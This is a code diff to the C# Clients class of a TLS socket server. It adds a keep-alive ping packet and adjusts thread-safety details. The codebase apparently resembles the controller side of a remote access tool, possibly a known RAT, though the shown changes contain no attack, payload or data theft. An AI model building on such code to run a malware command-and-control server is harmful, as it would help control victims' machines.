@@ -26,11 +26,12 @@ namespace Server.Connection
         private int ClientBuffersize { get; set; }
         private bool ClientBufferRecevied { get; set; }
         private MemoryStream ClientMS { get; set; }
-        public object SendSync { get; } = new object();
+        public object SendSync { get; set; }
         public long BytesRecevied { get; set; }
 
         public Clients(Socket socket)
         {
+            SendSync = new object();
             TcpClient = socket;
             SslClient = new SslStream(new NetworkStream(TcpClient, true), false);
             SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, EndAuthenticate, null);
@@ -122,7 +123,7 @@ namespace Server.Connection
         {
             if (LV != null)
             {
-                Program.form1.BeginInvoke((MethodInvoker)(() =>
+                Program.form1.Invoke((MethodInvoker)(() =>
                 {
                     try
                     {
@@ -268,5 +269,26 @@ namespace Server.Connection
             }
         }
 
+        public void KeepAlivePacket(object o)
+        {
+            lock (SendSync)
+            {
+                try
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "Ping";
+                    msgpack.ForcePathObject("Message").AsString = "This is a ping!";
+                    byte[] buffer = msgpack.Encode2Bytes();
+                    byte[] buffersize = BitConverter.GetBytes(buffer.Length);
+                    SslClient.Write(buffersize, 0, buffersize.Length);
+                    SslClient.Write(buffer, 0, buffer.Length);
+                    SslClient.Flush();
+                }
+                catch
+                {
+                    Disconnected();
+                }
+            }
+        }
     }
 }
